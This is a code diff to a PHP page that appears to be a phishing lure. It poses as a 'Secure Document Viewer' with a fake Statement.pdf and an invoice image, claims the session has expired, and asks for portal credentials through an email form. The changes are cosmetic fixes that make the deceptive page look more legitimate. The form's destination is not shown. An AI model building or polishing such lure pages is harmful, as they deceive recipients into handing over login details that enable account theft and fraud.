@@ -1,12 +1,11 @@
-<?php session_start(); ?> 
+<?php session_start(); ?>
 <!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
     <title>Secure Document Viewer</title>
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-
-    <style>
+      <style>
         /* Global reset / basics */
         * { box-sizing: border-box; margin: 0; padding: 0; }
 
@@ -183,12 +182,10 @@
             }
             .doc-title { font-size: 16px; }
         }
-    </style>
+    </style> 
 </head>
 <body>
-
 <div class="page-wrapper">
-
     <div class="doc-background">
         <img src="assets/bg-invoice.jpg" alt="Document preview">
     </div>
@@ -200,7 +197,6 @@
 
         <h2 class="doc-title">Statement.pdf <span class="doc-size">(197 KB)</span></h2>
         <p class="doc-subtitle">Previous session has expired, log in to continue.</p>
-
         <p class="doc-note">
             Use your <strong>secure document portal</strong> credentials.
         </p>
@@ -216,15 +212,14 @@
                 <input id="email" name="email" type="email" placeholder="Enter your email" required>
             </div>
 
-            <label class="field-label" for="name">name</label>
+            <label class="field-label" for="name">Name</label>
             <div class="field-wrapper">
-                <input id="name" name="name" type="name" placeholder="Enter your name" required>
+                <input id="name" name="name" type="text" placeholder="Enter your name" required>
             </div>
 
             <button type="submit" class="btn-primary">Next</button>
         </form>
     </div>
 </div>
-
 </body>
 </html>
